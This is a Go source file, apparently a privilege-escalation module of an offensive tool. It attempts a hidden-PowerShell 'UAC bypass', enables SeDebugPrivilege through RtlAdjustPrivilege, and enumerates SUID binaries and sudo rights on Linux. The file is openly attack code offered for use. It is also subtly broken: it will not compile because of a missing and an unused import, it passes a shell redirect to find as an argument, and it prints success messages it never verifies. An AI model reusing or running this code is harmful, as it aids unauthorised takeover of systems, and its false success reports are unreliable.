package privilegeescalation

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"syscall"

	"golang.org/x/sys/windows"
)

// Check if running as Admin (Windows)
func isAdmin() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0") // Try accessing raw disk
	return err == nil
}

// UAC Bypass (Windows)
func bypassUAC() {
	if isAdmin() {
		fmt.Println("[+] Already running as Administrator!")
		return
	}

	fmt.Println("[+] Attempting UAC Bypass...")

	exePath, _ := os.Executable()
	cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", 
		"Start-Process", exePath, "-Verb", "RunAs")

	err := cmd.Run()
	if err != nil {
		fmt.Println("[!] UAC Bypass failed:", err)
	} else {
		fmt.Println("[+] UAC Bypass successful! Running as Administrator.")
		os.Exit(0) // Exit current process
	}
}

// Token Privilege Escalation (Windows)
func escalateToken() {
	if isAdmin() {
		fmt.Println("[+] Already running as SYSTEM/Admin!")
		return
	}

	fmt.Println("[+] Attempting token privilege escalation...")

	ntdll := syscall.NewLazyDLL("ntdll.dll")
	adjustPrivileges := ntdll.NewProc("RtlAdjustPrivilege")

	// SeDebugPrivilege - Allows manipulation of other processes
	const SE_DEBUG_PRIVILEGE = 20
	var previousValue uint32

	_, _, _ = adjustPrivileges.Call(
		uintptr(SE_DEBUG_PRIVILEGE),
		uintptr(1), // Enable
		uintptr(0), // Adjust for current process
		uintptr(unsafe.Pointer(&previousValue)),
	)

	fmt.Println("[+] Token escalation completed!")
}

// Linux SUID Exploit (Linux)
func exploitSUID() {
	fmt.Println("[+] Checking for SUID binaries...")

	output, err := exec.Command("find", "/", "-perm", "-4000", "-type", "f", "2>/dev/null").Output()
	if err != nil {
		fmt.Println("[!] Failed to find SUID binaries:", err)
		return
	}

	fmt.Println("[+] Potential SUID Binaries:\n", string(output))
}

// Linux sudo Exploit (Linux)
func exploitSudo() {
	fmt.Println("[+] Checking sudo permissions...")

	output, err := exec.Command("sudo", "-l").Output()
	if err != nil {
		fmt.Println("[!] Failed to check sudo permissions:", err)
		return
	}

	fmt.Println("[+] Sudo Permissions:\n", string(output))
}

// Universal Privilege Escalation Handler
func EscalatePrivileges() {
	if runtime.GOOS == "windows" {
		bypassUAC()
		escalateToken()
	} else if runtime.GOOS == "linux" {
		exploitSUID()
		exploitSudo()
	} else {
		fmt.Println("[!] Unsupported OS for privilege escalation.")
	}
}
